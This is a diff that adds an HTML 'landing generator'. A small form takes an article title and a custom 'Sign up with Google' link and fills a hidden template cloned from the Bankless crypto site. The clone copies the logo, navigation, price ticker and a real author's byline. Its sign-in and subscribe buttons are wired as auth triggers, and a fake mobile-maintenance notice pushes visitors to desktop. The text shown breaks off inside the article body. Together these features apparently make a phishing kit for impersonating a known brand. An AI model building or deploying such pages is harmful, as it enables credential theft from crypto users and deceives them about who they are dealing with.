@@ -1,0 +1,1039 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Генератор лендингов Bankless</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Manrope', sans-serif; background-color: #f3f4f6; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <!-- Интерфейс конструктора -->
+    <div class="bg-white p-8 rounded-2xl shadow-xl max-w-lg w-full border border-gray-100">
+        <div class="flex items-center gap-3 mb-6">
+            <div class="w-10 h-10 bg-red-600 rounded-full flex items-center justify-center text-white font-bold text-xl">B</div>
+            <h1 class="text-2xl font-extrabold text-gray-900">Генератор Статьи</h1>
+        </div>
+        
+        <p class="text-gray-500 mb-6 text-sm">
+            Введите данные ниже. Конструктор подставит их в шаблон и отдаст готовый файл <strong>index.html</strong>.
+        </p>
+
+        <div class="space-y-5">
+            <!-- Поле: Title -->
+            <div>
+                <label class="block text-sm font-bold text-gray-700 mb-1">Заголовок статьи (Title)</label>
+                <input type="text" id="inputTitle" placeholder="Например: The Automated Nexus: Architecting..." 
+                    class="w-full border border-gray-300 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-red-600 focus:ring-1 focus:ring-red-600 transition-colors">
+            </div>
+
+            <!-- Поле: Google Link -->
+            <div>
+                <label class="block text-sm font-bold text-gray-700 mb-1">Ссылка для "Sign up with Google"</label>
+                <input type="url" id="inputGoogleLink" placeholder="https://ваша-ссылка.com/auth..." 
+                    class="w-full border border-gray-300 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-red-600 focus:ring-1 focus:ring-red-600 transition-colors">
+            </div>
+
+            <!-- Кнопка генерации -->
+            <button id="generateBtn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3.5 px-6 rounded-xl transition-all shadow-md hover:shadow-lg mt-2">
+                Сгенерировать index.html
+            </button>
+        </div>
+    </div>
+
+    <!-- 
+      ШАБЛОН САЙТА 
+      Используем <textarea>, чтобы браузер не пытался парсить теги <script> внутри шаблона.
+    -->
+    <textarea id="site-template" style="display:none;">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{TITLE}}</title>
+    
+    <!-- Suggested URL -->
+    <link rel="canonical" href="https://www.bankless.com/read/{{SLUG}}" />
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" sizes="32x32" href="https://www.bankless.com/assets/img/favicon/favicon-32x32.png">
+    
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600;8..60,700&display=swap" rel="stylesheet">
+    
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        banklessRed: '#EB212E',
+                        textMain: '#1c1c1d',
+                        textLight: '#727272',
+                        textMuted: '#8a8a8a',
+                        borderGray: '#eaeaea',
+                        bgGray: '#f9f9f9'
+                    },
+                    fontFamily: {
+                        sans: ['Manrope', 'sans-serif'],
+                        serif: ['"Source Serif 4"', 'Georgia', 'serif'],
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        /* Pixel-perfect typography and custom resets */
+        body {
+            background-color: #ffffff;
+            color: #1c1c1d;
+            font-family: 'Manrope', sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .promoBanner {
+            background-color: #000;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            height: 40px;
+        }
+
+        /* Pseudo-element Icons */
+        .promo-close::before {
+            content: "\f00d";
+            font-family: "Font Awesome 6 Free";
+            font-weight: 900;
+        }
+        
+        .search-icon::before {
+            content: "\f002";
+            font-family: "Font Awesome 6 Free";
+            font-weight: 900;
+        }
+
+        .header-link {
+            font-weight: 700;
+            font-size: 14px;
+            color: #1c1c1d;
+            transition: color 0.2s ease;
+        }
+        .header-link:hover {
+            color: #EB212E;
+        }
+
+        .btn-premium {
+            background-color: #EB212E;
+            color: #ffffff;
+            font-weight: 700;
+            padding: 8px 20px;
+            border-radius: 999px;
+            font-size: 14px;
+            transition: background-color 0.2s;
+        }
+        .btn-premium:hover {
+            background-color: #c91b26;
+        }
+
+        .btn-subscribe {
+            border: 1px solid #eaeaea;
+            color: #1c1c1d;
+            font-weight: 700;
+            padding: 8px 20px;
+            border-radius: 999px;
+            font-size: 14px;
+            transition: all 0.2s;
+        }
+        .btn-subscribe:hover {
+            border-color: #000;
+        }
+
+        /* Infinite Ticker Marquee */
+        .ticker-wrap {
+            height: 40px;
+            border-bottom: 1px solid #eaeaea;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            background-color: #fff;
+        }
+
+        @keyframes marquee {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        .ticker-track {
+            display: flex;
+            width: max-content;
+            /* Extra slowed down for extremely comfortable reading */
+            animation: marquee 150s linear infinite;
+        }
+
+        .ticker-track:hover {
+            animation-play-state: paused;
+        }
+
+        .ticker-item p {
+            display: flex;
+            gap: 2rem;
+            margin: 0;
+            padding-right: 2rem;
+        }
+
+        .ticker-item a {
+            display: inline-flex;
+            align-items: center;
+            font-size: 11px;
+            font-weight: 700;
+            color: #1c1c1d;
+            text-transform: uppercase;
+            text-decoration: none;
+            white-space: nowrap;
+            letter-spacing: 0.5px;
+        }
+
+        .ticker-item a:hover {
+            text-decoration: underline;
+        }
+
+        .tickerPriceDesktop {
+            margin-left: 8px;
+        }
+
+        .tickerPriceDesktop span:first-child {
+            color: #8a8a8a;
+            font-weight: 600;
+        }
+
+        .tickerPriceDesktop span:last-child {
+            margin-left: 6px;
+        }
+
+        .tickerPriceMobile {
+            display: none;
+        }
+
+        /* Article Specifics */
+        .article-title {
+            font-size: 44px;
+            font-weight: 800;
+            line-height: 1.15;
+            letter-spacing: -0.02em;
+            margin-bottom: 16px;
+        }
+        
+        .article-desc {
+            font-size: 22px;
+            color: #555555;
+            line-height: 1.4;
+            font-weight: 400;
+            margin-bottom: 32px;
+        }
+
+        .breadcrumb {
+            font-size: 13px;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: #8a8a8a;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
+        }
+
+        .breadcrumb a:hover {
+            color: #1c1c1d;
+        }
+
+        /* Article Body Typography */
+        .article-content {
+            font-family: 'Source Serif 4', serif;
+            font-size: 21px;
+            line-height: 1.65;
+            color: #1c1c1d;
+        }
+
+        .article-content p {
+            margin-bottom: 32px;
+        }
+
+        .article-content a {
+            color: #8a8a8a;
+            text-decoration: underline;
+            text-decoration-thickness: 1px;
+            text-underline-offset: 3px;
+            transition: color 0.2s;
+        }
+        .article-content a:hover {
+            color: #EB212E;
+        }
+
+        .article-content h3 {
+            font-family: 'Manrope', sans-serif;
+            font-size: 28px;
+            font-weight: 800;
+            margin-top: 48px;
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+
+        .article-content ul {
+            list-style-type: disc;
+            padding-left: 40px;
+            margin-bottom: 32px;
+        }
+
+        .article-content li {
+            margin-bottom: 12px;
+            padding-left: 8px;
+        }
+
+        /* Interaction Bar */
+        .interaction-bar {
+            display: flex;
+            align-items: center;
+            gap: 24px;
+            padding: 16px 0;
+            border-top: 1px solid #eaeaea;
+            border-bottom: 1px solid #eaeaea;
+            margin: 32px 0;
+            font-size: 14px;
+            font-weight: 600;
+            color: #727272;
+            font-family: 'Manrope', sans-serif;
+        }
+        .interaction-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+        .interaction-item:hover {
+            color: #1c1c1d;
+        }
+        .interaction-item i {
+            font-size: 18px;
+        }
+
+        /* Sidebar Sponsored Box */
+        .sidebar-sponsor {
+            border: 1px solid #eaeaea;
+            border-radius: 12px;
+            padding: 24px;
+            background: #fff;
+            transition: box-shadow 0.2s, border-color 0.2s;
+        }
+        .sidebar-sponsor:hover {
+            border-color: #d0d0d0;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+        }
+
+        /* Tweet Embed Mock */
+        .tweet-mock {
+            border: 1px solid #eaeaea;
+            border-radius: 12px;
+            padding: 16px;
+            max-width: 550px;
+            margin: 40px auto;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        /* Pop-up blur classes */
+        .blur-bg {
+            backdrop-filter: blur(5px);
+            background-color: rgba(255, 255, 255, 0.4);
+        }
+        
+        /* Smooth error text transitions */
+        .error-text {
+            transition: all 0.3s ease;
+            max-height: 0;
+            opacity: 0;
+            overflow: hidden;
+        }
+        .error-text.show {
+            max-height: 40px;
+            opacity: 1;
+            margin-top: 4px;
+        }
+    </style>
+</head>
+<body class="pt-[146px]"> <!-- Offset for fixed header elements -->
+
+    <!-- Global Top Banner -->
+    <div class="promoBanner fixed top-0 w-full z-50 flex justify-center items-center">
+        <span class="flex items-center">
+            <img src="https://cdn.bankless.com/posts/full/2026-03-06/epics-antitrust-lawsuit-win-opens-doors-for-crypto-payments-on-android-apps-featured-image-69a9ea8f6ddf730001f9a631.jpg" style="width:20px; height:20px; border-radius:50%; object-fit:cover;" class="mr-2" alt="Mercuryo">
+            <a href="#" class="text-banklessRed hover:text-white transition-colors mr-1">Mercuryo</a>
+            <span class="mr-2 font-normal text-gray-300 hidden md:inline">- Infrastructure powering the crypto economy.</span>
+        </span>
+        <span class="bg-[#252525] text-[#8A8A8A] text-[10px] uppercase px-2 py-[2px] rounded-full mx-2 font-bold tracking-wide hidden sm:inline">
+            Friend & Sponsor
+        </span>
+        <a href="#" class="bg-[#252525] text-white px-3 py-1.5 text-xs rounded-full ml-2 hover:bg-gray-700 transition-colors flex items-center font-bold">
+            Learn more <i class="fas fa-arrow-right ml-1.5"></i>
+        </a>
+        <i class="promo-close absolute right-4 md:right-8 text-white opacity-70 hover:opacity-100 cursor-pointer text-lg"></i>
+    </div>
+
+    <!-- Main Header -->
+    <header class="fixed top-[40px] w-full bg-white z-40 border-b border-[#eaeaea] h-[66px] flex items-center justify-between px-4 md:px-8">
+        <!-- Logo Centered Absolute -->
+        <a href="https://www.bankless.com/" class="flex-shrink-0 absolute left-1/2 transform -translate-x-1/2">
+            <svg width="146" height="34" viewBox="0 0 112 26" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <g clip-path="url(#clip0_18052_15445)">
+                    <path d="M12.5632 12.0915C12.5632 13.6677 12.0192 14.8213 10.9322 15.5525C9.84532 16.2837 8.33591 16.6493 6.40504 16.6493H0.474609V0.917969H6.0515C8.07318 0.917969 9.5224 1.21132 10.397 1.79911C11.2715 2.3869 11.7083 3.3162 11.7083 4.59029C11.7083 5.56775 11.4708 6.36025 10.9957 6.9666C10.5207 7.573 9.77746 7.97802 8.76604 8.18271C10.0894 8.36439 11.0527 8.78144 11.6569 9.43269C12.261 10.0851 12.5632 10.9717 12.5632 12.0926V12.0915ZM8.4574 5.2941C8.4574 4.69537 8.23627 4.28052 7.79627 4.04957C7.35517 3.81861 6.67103 3.70258 5.74391 3.70258H3.69158V7.07827H5.65304C6.60317 7.07827 7.30805 6.9458 7.76891 6.68091C8.2286 6.41603 8.45851 5.95304 8.45851 5.2941H8.4574ZM9.27831 11.808C9.27831 11.103 9.03859 10.605 8.5603 10.3127C8.08085 10.0216 7.18441 9.8749 5.86871 9.8749H3.69048V13.8078H5.32141C6.5758 13.8078 7.44052 13.7476 7.91555 13.6261C8.39064 13.5045 8.73652 13.2998 8.95324 13.012C9.16995 12.7241 9.27831 12.3224 9.27831 11.8069V11.808Z" fill="black"></path>
+                    <path d="M13.7324 16.6504L18.9558 0.917969H23.1415L28.3757 16.6504H25.08L24.0302 13.4564H17.9521L16.9254 16.6504H13.7324ZM18.8638 10.6488H23.1174L20.9961 4.14698L18.8638 10.6488Z" fill="black"></path>
+                    <path d="M39.341 16.6504L33.5933 5.40794V16.6504H30.4453V0.917969H34.619L39.9671 11.5244V0.917969H43.1261V16.6504H39.3399H39.341Z" fill="black"></path>
+                    <path d="M55.0508 16.6504L50.6834 10.0796L49.7257 11.1818V16.6493H46.5098V0.917969H49.7257V7.05636L54.8921 0.917969H58.6445L52.7598 7.69344L59.0655 16.6515H55.0519L55.0508 16.6504Z" fill="black"></path>
+                    <path d="M61.1406 16.6504V0.917969H64.3566V13.718H70.9939V16.6504H61.1406Z" fill="black"></path>
+                    <path d="M73.0566 16.6504V0.917969H83.3088V3.74856H76.2726V7.10238H82.2031V9.94387H76.2726V13.718H83.3088V16.6504H73.0566Z" fill="black"></path>
+                    <path d="M97.6302 12.0911C97.6302 13.6673 97.1115 14.8757 96.0738 15.7174C95.036 16.5592 93.506 16.9795 91.484 16.9795C90.0853 16.9795 88.8705 16.7485 87.8404 16.2866C86.8103 15.8247 85.9717 15.0782 85.3262 14.0471L87.8007 12.16C88.1653 12.6756 88.5113 13.062 88.8384 13.3192C89.1656 13.5764 89.5535 13.7778 90.002 13.9212C90.4511 14.0657 90.9675 14.1368 91.5529 14.1368C92.428 14.1368 93.1093 13.9869 93.5998 13.6881C94.0903 13.3892 94.3353 12.9317 94.3353 12.3187C94.3353 11.9707 94.2503 11.6784 94.0793 11.4431C93.9088 11.2077 93.6517 11.0052 93.3102 10.8345C92.9687 10.6637 92.375 10.4689 91.5314 10.2489C90.7104 10.0289 89.9364 9.80779 89.2109 9.5834C88.4848 9.36012 87.858 9.07002 87.3289 8.71427C86.8004 8.35857 86.3844 7.91085 86.0804 7.37236C85.7758 6.83488 85.6236 6.15625 85.6236 5.33751C85.6236 3.8445 86.1295 2.67987 87.1408 1.84252C88.1521 1.00516 89.6004 0.585938 91.4851 0.585938C94.2139 0.585938 96.146 1.51852 97.2787 3.38259L94.8269 5.29264C94.3938 4.62604 93.9077 4.1488 93.367 3.85983C92.8274 3.57196 92.1847 3.42747 91.4393 3.42747C90.6939 3.42747 90.0876 3.5621 89.6202 3.83137C89.1529 4.10064 88.9184 4.52315 88.9184 5.0989C88.9184 5.60678 89.1612 5.99536 89.6484 6.26351C90.1344 6.53281 90.983 6.80315 92.1913 7.0757C92.86 7.24977 93.5209 7.43802 94.1758 7.6383C94.8291 7.83973 95.4128 8.11774 95.9259 8.4735C96.4396 8.82925 96.8522 9.29551 97.164 9.87129C97.4757 10.447 97.6313 11.1859 97.6313 12.0878L97.6302 12.0911Z" fill="black"></path>
+                    <path d="M111.765 12.0911C111.765 13.6673 111.246 14.8757 110.209 15.7174C109.171 16.5592 107.641 16.9795 105.619 16.9795C104.22 16.9795 103.005 16.7485 101.975 16.2866C100.945 15.8247 100.106 15.0782 99.4609 14.0471L101.935 12.16C102.3 12.6756 102.646 13.062 102.973 13.3192C103.3 13.5764 103.688 13.7778 104.137 13.9212C104.585 14.0657 105.102 14.1368 105.688 14.1368C106.562 14.1368 107.244 13.9869 107.735 13.6881C108.225 13.3892 108.47 12.9317 108.47 12.3187C108.47 11.9707 108.385 11.6784 108.214 11.4431C108.044 11.2077 107.786 11.0052 107.444 10.8345C107.103 10.6637 106.51 10.4689 105.666 10.2489C104.845 10.0289 104.071 9.80779 103.346 9.5834C102.62 9.36012 101.993 9.07002 101.464 8.71427C100.935 8.35857 100.519 7.91085 100.215 7.37236C99.9106 6.83488 99.7583 6.15625 99.7583 5.33751C99.7583 3.8445 100.264 2.67987 101.276 1.84252C102.287 1.00516 103.735 0.585938 105.62 0.585938C108.349 0.585938 110.281 1.51852 111.413 3.38259L108.962 5.29264C108.529 4.62604 108.042 4.1488 107.502 3.85983C106.962 3.57196 106.319 3.42747 105.574 3.42747C104.829 3.42747 104.222 3.5621 103.755 3.83137C103.287 4.10064 103.053 4.52315 103.053 5.0989C103.053 5.60678 103.296 5.99536 103.783 6.26351C104.269 6.53281 105.118 6.80315 106.326 7.0757C106.995 7.24977 107.656 7.43802 108.311 7.6383C108.964 7.83973 109.548 8.11774 110.061 8.4735C110.574 8.82925 110.986 9.29551 111.299 9.87129C111.61 10.447 111.766 11.1859 111.766 12.0878L111.765 12.0911Z" fill="black"></path>
+                    <path d="M111.751 22.2617H0.462891V25.308H111.751V22.2617Z" fill="#EB212E"></path>
+                </g>
+                <defs>
+                    <clipPath id="clip0_18052_15445">
+                        <rect width="112" height="24.8276" fill="white" transform="translate(0 0.585938)"></rect>
+                    </clipPath>
+                </defs>
+            </svg>
+        </a>
+
+        <!-- Left Nav - Hidden on mobile -->
+        <nav class="hidden md:flex gap-6 z-10">
+            <a href="https://www.bankless.com/podcast" class="header-link">Podcast</a>
+            <a href="https://www.bankless.com/read" class="header-link">Analysis</a>
+            <a href="https://www.bankless.com/newsletters" class="header-link">Newsletters</a>
+            <a href="https://www.bankless.com/airdrop-hunter" class="header-link">Airdrops</a>
+            <a href="https://www.bankless.com/yield-hunter" class="header-link">Tools</a>
+        </nav>
+
+        <!-- Right Nav -->
+        <div class="flex items-center gap-2 md:gap-5 z-10 ml-auto md:ml-0">
+            <button class="text-gray-500 hover:text-black text-[15px] transition-colors mr-2 flex items-center justify-center">
+                <i class="search-icon"></i>
+            </button>
+            <a href="https://www.bankless.com/ico-watch" class="header-link hidden lg:block">ICO Watch</a>
+            <a href="#" class="header-link hidden md:block auth-trigger">Sign In</a>
+            <a href="#" class="btn-subscribe hidden sm:block auth-trigger">Subscribe</a>
+            <a href="#" class="btn-premium auth-trigger">Go Premium</a>
+        </div>
+    </header>
+
+    <!-- Ticker -->
+    <div class="ticker-wrap fixed top-[106px] w-full z-30">
+        <div class="ticker-track">
+            <!-- First Set -->
+            <div class="ticker-item">
+                <p>
+                    <a href="https://www.bankless.com/prices/bitcoin">
+                        BTC <span class="tickerPriceDesktop"><span>$70,570.00</span><span style="color:#E92735;">-3.89%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/ethereum">
+                        ETH <span class="tickerPriceDesktop"><span>$2,066.62</span><span style="color:#E92735;">-4.23%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/binancecoin">
+                        BNB <span class="tickerPriceDesktop"><span>$640.12</span><span style="color:#E92735;">-3.60%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/solana">
+                        SOL <span class="tickerPriceDesktop"><span>$87.75</span><span style="color:#E92735;">-5.05%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/ripple">
+                        XRP <span class="tickerPriceDesktop"><span>$1.40</span><span style="color:#E92735;">-3.14%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/dogecoin">
+                        DOGE <span class="tickerPriceDesktop"><span>$0.09</span><span style="color:#E92735;">-3.87%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/tron">
+                        TRX <span class="tickerPriceDesktop"><span>$0.29</span><span style="color:#11BD20;">0.88%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/cardano">
+                        ADA <span class="tickerPriceDesktop"><span>$0.27</span><span style="color:#E92735;">-2.90%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/the-open-network">
+                        TON <span class="tickerPriceDesktop"><span>$3.03</span><span style="color:#11BD20;">10.57%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/shiba-inu">
+                        SHIB <span class="tickerPriceDesktop"><span>$0.00</span><span style="color:#11BD20;">0.99%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/avalanche-2">
+                        AVAX <span class="tickerPriceDesktop"><span>$28.30</span><span style="color:#E92735;">-0.69%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/bitcoin-cash">
+                        BCH <span class="tickerPriceDesktop"><span>$457.06</span><span style="color:#E92735;">-1.92%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/chainlink">
+                        LINK <span class="tickerPriceDesktop"><span>$9.15</span><span style="color:#E92735;">-2.96%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/leo-token">
+                        LEO <span class="tickerPriceDesktop"><span>$9.05</span><span style="color:#11BD20;">0.71%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/sui">
+                        SUI <span class="tickerPriceDesktop"><span>$2.65</span><span style="color:#E92735;">-21.81%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/polkadot">
+                        DOT <span class="tickerPriceDesktop"><span>$7.76</span><span style="color:#11BD20;">1.42%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/litecoin">
+                        LTC <span class="tickerPriceDesktop"><span>$102.89</span><span style="color:#E92735;">-11.81%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/near">
+                        NEAR <span class="tickerPriceDesktop"><span>$3.75</span><span style="color:#11BD20;">1.55%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/aptos">
+                        APT <span class="tickerPriceDesktop"><span>$8.30</span><span style="color:#E92735;">-0.02%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/uniswap">
+                        UNI <span class="tickerPriceDesktop"><span>$7.05</span><span style="color:#11BD20;">1.65%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/pepe">
+                        PEPE <span class="tickerPriceDesktop"><span>$0.00</span><span style="color:#11BD20;">2.04%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/internet-computer">
+                        ICP <span class="tickerPriceDesktop"><span>$7.16</span><span style="color:#E92735;">-1.35%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/dai">
+                        DAI <span class="tickerPriceDesktop"><span>$1.00</span><span style="color:#E92735;">-0.16%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/bittensor">
+                        TAO <span class="tickerPriceDesktop"><span>$431.30</span><span style="color:#E92735;">-0.26%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/fetch-ai">
+                        FET <span class="tickerPriceDesktop"><span>$1.18</span><span style="color:#11BD20;">2.73%</span></span>
+                    </a>
+                </p>
+            </div>
+            
+            <!-- Duplicate for infinite seamless loop -->
+            <div class="ticker-item">
+                <p>
+                    <a href="https://www.bankless.com/prices/bitcoin">
+                        BTC <span class="tickerPriceDesktop"><span>$70,570.00</span><span style="color:#E92735;">-3.89%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/ethereum">
+                        ETH <span class="tickerPriceDesktop"><span>$2,066.62</span><span style="color:#E92735;">-4.23%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/binancecoin">
+                        BNB <span class="tickerPriceDesktop"><span>$640.12</span><span style="color:#E92735;">-3.60%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/solana">
+                        SOL <span class="tickerPriceDesktop"><span>$87.75</span><span style="color:#E92735;">-5.05%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/ripple">
+                        XRP <span class="tickerPriceDesktop"><span>$1.40</span><span style="color:#E92735;">-3.14%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/dogecoin">
+                        DOGE <span class="tickerPriceDesktop"><span>$0.09</span><span style="color:#E92735;">-3.87%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/tron">
+                        TRX <span class="tickerPriceDesktop"><span>$0.29</span><span style="color:#11BD20;">0.88%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/cardano">
+                        ADA <span class="tickerPriceDesktop"><span>$0.27</span><span style="color:#E92735;">-2.90%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/the-open-network">
+                        TON <span class="tickerPriceDesktop"><span>$3.03</span><span style="color:#11BD20;">10.57%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/shiba-inu">
+                        SHIB <span class="tickerPriceDesktop"><span>$0.00</span><span style="color:#11BD20;">0.99%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/avalanche-2">
+                        AVAX <span class="tickerPriceDesktop"><span>$28.30</span><span style="color:#E92735;">-0.69%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/bitcoin-cash">
+                        BCH <span class="tickerPriceDesktop"><span>$457.06</span><span style="color:#E92735;">-1.92%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/chainlink">
+                        LINK <span class="tickerPriceDesktop"><span>$9.15</span><span style="color:#E92735;">-2.96%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/leo-token">
+                        LEO <span class="tickerPriceDesktop"><span>$9.05</span><span style="color:#11BD20;">0.71%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/sui">
+                        SUI <span class="tickerPriceDesktop"><span>$2.65</span><span style="color:#E92735;">-21.81%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/polkadot">
+                        DOT <span class="tickerPriceDesktop"><span>$7.76</span><span style="color:#11BD20;">1.42%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/litecoin">
+                        LTC <span class="tickerPriceDesktop"><span>$102.89</span><span style="color:#E92735;">-11.81%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/near">
+                        NEAR <span class="tickerPriceDesktop"><span>$3.75</span><span style="color:#11BD20;">1.55%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/aptos">
+                        APT <span class="tickerPriceDesktop"><span>$8.30</span><span style="color:#E92735;">-0.02%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/uniswap">
+                        UNI <span class="tickerPriceDesktop"><span>$7.05</span><span style="color:#11BD20;">1.65%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/pepe">
+                        PEPE <span class="tickerPriceDesktop"><span>$0.00</span><span style="color:#11BD20;">2.04%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/internet-computer">
+                        ICP <span class="tickerPriceDesktop"><span>$7.16</span><span style="color:#E92735;">-1.35%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/dai">
+                        DAI <span class="tickerPriceDesktop"><span>$1.00</span><span style="color:#E92735;">-0.16%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/bittensor">
+                        TAO <span class="tickerPriceDesktop"><span>$431.30</span><span style="color:#E92735;">-0.26%</span></span>
+                    </a>
+                    <a href="https://www.bankless.com/prices/fetch-ai">
+                        FET <span class="tickerPriceDesktop"><span>$1.18</span><span style="color:#11BD20;">2.73%</span></span>
+                    </a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile Maintenance Fallback (Visible only on mobile) -->
+    <div class="block md:hidden text-center pt-32 px-6 h-screen flex flex-col justify-center items-center">
+        <div class="w-16 h-16 bg-gray-100 rounded-full flex items-center justify-center mb-6 text-banklessRed text-2xl mx-auto shadow-sm">
+            <i class="fa-solid fa-wrench"></i>
+        </div>
+        <h2 class="text-2xl font-bold mb-4">Mobile site under maintenance</h2>
+        <p class="text-textLight text-[16px] leading-relaxed max-w-[300px] mx-auto">
+            We apologize, but our mobile experience is currently down for scheduled maintenance. Please use a desktop or laptop to read this article.
+        </p>
+    </div>
+
+    <!-- Main Content Wrapper (Hidden on mobile) -->
+    <main class="hidden md:flex max-w-[1140px] mx-auto pt-16 px-4 gap-[60px] pb-24">
+        
+        <!-- Article Column -->
+        <article class="w-[700px] shrink-0">
+            <!-- Breadcrumbs -->
+            <div class="breadcrumb">
+                <a href="#">Home</a>, &nbsp;<a href="#">Read</a>, &nbsp;<a href="#">News</a>
+            </div>
+
+            <!-- Title -->
+            <h1 class="article-title">
+                {{TITLE}}
+            </h1>
+
+            <!-- Description -->
+            <div class="article-desc">
+                Google's settlement with Epic Games affirms the ability of developers globally to use alternative payments rails.
+            </div>
+
+            <!-- Meta / Author Block -->
+            <div class="flex items-center gap-3 mt-4 mb-8">
+                <img src="https://www.bankless.com/assets/cdn/authors/2026-02-26/jack-png-a6edd23702c9c6546ac12821152fde14.png" alt="Jack Inabinet" class="w-[42px] h-[42px] rounded-full object-cover">
+                <div class="text-[14px] font-semibold text-[#727272]">
+                    <a href="#" class="text-textMain hover:underline">Jack Inabinet</a><br>
+                    <span class="font-medium">Mar 5, 2026 • 1 min read</span>
+                </div>
+            </div>
+
+            <!-- Featured Image -->
+            <img src="https://cdn.bankless.com/posts/full/2026-03-06/epics-antitrust-lawsuit-win-opens-doors-for-crypto-payments-on-android-apps-featured-image-69a9ea8f6ddf730001f9a631.jpg" alt="Featured Image" class="w-full rounded-xl mb-6 object-cover h-[auto]">
+
+            <!-- Interaction Bar -->
+            <div class="interaction-bar">
+                <div class="interaction-item">
+                    <i class="fa-solid fa-play"></i>
+                    <span>Listen</span>
+                </div>
+                <div class="interaction-item">
+                    <i class="fa-light fa-heart"></i>
+                    <span>1</span>
+                </div>
+                <div class="interaction-item">
+                    <i class="fa-light fa-comment"></i>
+                    <span>0</span>
+                </div>
+                <div class="interaction-item ml-auto">
+                    <i class="fa-regular fa-bookmark"></i>
+                </div>
+                <div class="interaction-item relative group">
+                    <span class="flex items-center gap-1.5 px-3 py-1 bg-gray-100 rounded-full text-black hover:bg-gray-200 transition">
+                        <i class="fa-solid fa-sparkles text-xs"></i> AI
+                    </span>
+                </div>
+            </div>
+
+            <!-- Article Body -->
+            <div class="article-content">
